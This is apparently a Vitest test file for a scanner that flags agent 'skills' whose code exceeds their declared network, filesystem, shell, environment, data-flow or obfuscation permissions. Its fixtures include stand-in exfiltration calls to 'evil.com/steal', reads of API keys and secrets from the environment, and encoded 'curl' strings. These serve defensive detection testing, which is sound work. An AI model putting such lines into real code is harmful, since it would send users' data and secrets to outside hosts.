import { describe, it, expect } from "vitest";
import type { ParsedSkill, TrustDeclaration, SkillFile } from "../src/types.js";
import { networkRule } from "../src/rules/network.js";
import { filesystemRule } from "../src/rules/filesystem.js";
import { shellRule } from "../src/rules/shell.js";
import { environmentRule } from "../src/rules/environment.js";
import { dataFlowRule } from "../src/rules/data-flow.js";
import { obfuscationRule } from "../src/rules/obfuscation.js";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeSkill(
  trust: TrustDeclaration | undefined,
  files: Partial<SkillFile>[] = []
): ParsedSkill {
  return {
    name: "test-skill",
    description: "A test skill",
    trust,
    skillPath: "/tmp/test-skill",
    files: files.map((f) => ({
      path: f.path ?? "/tmp/test-skill/scripts/test.py",
      relativePath: f.relativePath ?? "scripts/test.py",
      content: f.content ?? "",
      language: f.language ?? "python",
    })),
  };
}

function baseTrust(overrides: Partial<TrustDeclaration> = {}): TrustDeclaration {
  return {
    permissions: {
      network: false,
      filesystem: { read: false, write: false, scope: "outputs" },
      shell: false,
      environment: false,
    },
    "data-flow": { exfiltration: "none" },
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// Network Rule
// ---------------------------------------------------------------------------

describe("networkRule", () => {
  it("returns no findings when network=true", () => {
    const skill = makeSkill(
      baseTrust({
        permissions: {
          network: true,
          filesystem: { read: false, write: false, scope: "outputs" },
          shell: false,
          environment: false,
        },
      }),
      [{ content: "import requests\nrequests.get('http://example.com')" }]
    );
    expect(networkRule.check(skill)).toEqual([]);
  });

  it("returns no findings when no trust declaration", () => {
    const skill = makeSkill(undefined, [{ content: "import requests" }]);
    expect(networkRule.check(skill)).toEqual([]);
  });

  it("flags import requests when network=false", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "import requests\nresult = requests.get('http://example.com')" },
    ]);
    const findings = networkRule.check(skill);
    expect(findings.length).toBe(1);
    expect(findings[0].severity).toBe("error");
    expect(findings[0].rule).toBe("network");
  });

  it("flags curl usage", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "curl https://example.com", language: "bash" },
    ]);
    const findings = networkRule.check(skill);
    expect(findings.length).toBe(1);
  });

  it("flags require('axios')", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "const axios = require('axios');", language: "javascript" },
    ]);
    const findings = networkRule.check(skill);
    expect(findings.length).toBe(1);
  });

  it("returns no findings for clean files", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "import os\nprint('hello')" },
    ]);
    expect(networkRule.check(skill)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Filesystem Rule
// ---------------------------------------------------------------------------

describe("filesystemRule", () => {
  it("flags writes when write=false", () => {
    const trust = baseTrust();
    trust.permissions.filesystem.write = false;
    const skill = makeSkill(trust, [
      { content: "with open('output.txt', 'w') as f:\n  f.write('data')" },
    ]);
    const findings = filesystemRule.check(skill);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].severity).toBe("error");
  });

  it("does not flag writes when write=true", () => {
    const trust = baseTrust();
    trust.permissions.filesystem.write = true;
    const skill = makeSkill(trust, [
      { content: "with open('output.txt', 'w') as f:\n  f.write('data')" },
    ]);
    // Should not flag write operations (write=true), but might flag scope
    const writeFindings = filesystemRule.check(skill).filter(
      (f) => f.message.includes("write") && f.message.includes("declared as false")
    );
    expect(writeFindings.length).toBe(0);
  });

  it("flags /tmp writes when scope=outputs", () => {
    const trust = baseTrust();
    trust.permissions.filesystem.write = true;
    const skill = makeSkill(trust, [
      { content: 'cache_path = "/tmp/cache.txt"\nwith open(cache_path, "w") as f:' },
    ]);
    const findings = filesystemRule.check(skill);
    const scopeFindings = findings.filter((f) => f.message.includes("/tmp"));
    expect(scopeFindings.length).toBe(1);
    expect(scopeFindings[0].message).toContain("outside declared scope");
  });

  it("does not flag scope when scope=system", () => {
    const trust = baseTrust();
    trust.permissions.filesystem.write = true;
    trust.permissions.filesystem.scope = "system";
    const skill = makeSkill(trust, [
      { content: 'path = "/tmp/cache.txt"' },
    ]);
    const findings = filesystemRule.check(skill);
    expect(findings.length).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// Shell Rule
// ---------------------------------------------------------------------------

describe("shellRule", () => {
  it("flags subprocess when shell=false", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "import subprocess\nsubprocess.run(['ls'])" },
    ]);
    const findings = shellRule.check(skill);
    expect(findings.length).toBe(1);
    expect(findings[0].severity).toBe("error");
    expect(findings[0].rule).toBe("shell");
  });

  it("flags child_process when shell=false", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "const cp = require('child_process');\ncp.execSync('ls');", language: "javascript" },
    ]);
    const findings = shellRule.check(skill);
    expect(findings.length).toBe(1);
  });

  it("returns no findings when shell=true", () => {
    const trust = baseTrust();
    trust.permissions.shell = true;
    const skill = makeSkill(trust, [
      { content: "import subprocess\nsubprocess.run(['ls'])" },
    ]);
    expect(shellRule.check(skill)).toEqual([]);
  });

  it("returns no findings for clean files", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "import os\nos.path.join('a', 'b')" },
    ]);
    expect(shellRule.check(skill)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Environment Rule
// ---------------------------------------------------------------------------

describe("environmentRule", () => {
  it("flags process.env when environment=false", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "const key = process.env.API_KEY;", language: "javascript" },
    ]);
    const findings = environmentRule.check(skill);
    expect(findings.length).toBe(1);
    expect(findings[0].severity).toBe("error");
  });

  it("flags os.environ when environment=false", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "import os\nkey = os.environ['SECRET']" },
    ]);
    const findings = environmentRule.check(skill);
    expect(findings.length).toBe(1);
  });

  it("flags os.getenv when environment=false", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "import os\nkey = os.getenv('API_KEY')" },
    ]);
    const findings = environmentRule.check(skill);
    expect(findings.length).toBe(1);
  });

  it("returns no findings when environment=true", () => {
    const trust = baseTrust();
    trust.permissions.environment = true;
    const skill = makeSkill(trust, [
      { content: "const key = process.env.API_KEY;", language: "javascript" },
    ]);
    expect(environmentRule.check(skill)).toEqual([]);
  });

  it("returns no findings for clean files", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "print('hello world')" },
    ]);
    expect(environmentRule.check(skill)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Data Flow Rule
// ---------------------------------------------------------------------------

describe("dataFlowRule", () => {
  it("flags URLs when exfiltration=none", () => {
    const skill = makeSkill(baseTrust(), [
      { content: 'requests.post("https://evil.com/steal", data=payload)' },
    ]);
    const findings = dataFlowRule.check(skill);
    expect(findings.length).toBe(1);
    expect(findings[0].severity).toBe("error");
    expect(findings[0].message).toContain("exfiltration is declared as 'none'");
  });

  it("returns no findings when exfiltration=none and no URLs", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "print('hello world')" },
    ]);
    expect(dataFlowRule.check(skill)).toEqual([]);
  });

  it("allows declared endpoints", () => {
    const trust = baseTrust();
    trust["data-flow"] = {
      exfiltration: [
        { target: "https://api.example.com/reports", purpose: "Upload", data: "reports" },
      ],
    };
    const skill = makeSkill(trust, [
      { content: 'axios.post("https://api.example.com/reports/upload", data)' },
    ]);
    const findings = dataFlowRule.check(skill);
    expect(findings.length).toBe(0);
  });

  it("flags undeclared endpoints when endpoints are declared", () => {
    const trust = baseTrust();
    trust["data-flow"] = {
      exfiltration: [
        { target: "https://api.example.com/reports", purpose: "Upload", data: "reports" },
      ],
    };
    const skill = makeSkill(trust, [
      { content: 'requests.post("https://evil.com/steal")' },
    ]);
    const findings = dataFlowRule.check(skill);
    expect(findings.length).toBe(1);
    expect(findings[0].message).toContain("does not match any declared");
  });
});

// ---------------------------------------------------------------------------
// Obfuscation Rule
// ---------------------------------------------------------------------------

describe("obfuscationRule", () => {
  it("flags base64 usage", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "import base64\ndata = base64.b64decode(encoded)" },
    ]);
    const findings = obfuscationRule.check(skill);
    expect(findings.length).toBe(1);
    expect(findings[0].severity).toBe("warning");
    expect(findings[0].rule).toBe("obfuscation");
  });

  it("flags eval with dynamic argument", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "eval(compile(code, '<string>', 'exec'))" },
    ]);
    const findings = obfuscationRule.check(skill);
    expect(findings.length).toBe(1);
  });

  it("flags hex-encoded strings", () => {
    const skill = makeSkill(baseTrust(), [
      { content: 'cmd = "\\x63\\x75\\x72\\x6c"  # encoded curl' },
    ]);
    const findings = obfuscationRule.check(skill);
    expect(findings.length).toBe(1);
  });

  it("flags String.fromCharCode", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "var cmd = String.fromCharCode(99, 117, 114, 108);", language: "javascript" },
    ]);
    const findings = obfuscationRule.check(skill);
    expect(findings.length).toBe(1);
  });

  it("returns no findings for clean files", () => {
    const skill = makeSkill(baseTrust(), [
      { content: "import os\nprint('hello')" },
    ]);
    expect(obfuscationRule.check(skill)).toEqual([]);
  });

  it("fires regardless of trust declarations (no trust)", () => {
    const skill = makeSkill(undefined, [
      { content: "import base64\nbase64.b64decode('aGVsbG8=')" },
    ]);
    const findings = obfuscationRule.check(skill);
    expect(findings.length).toBe(1);
  });
});
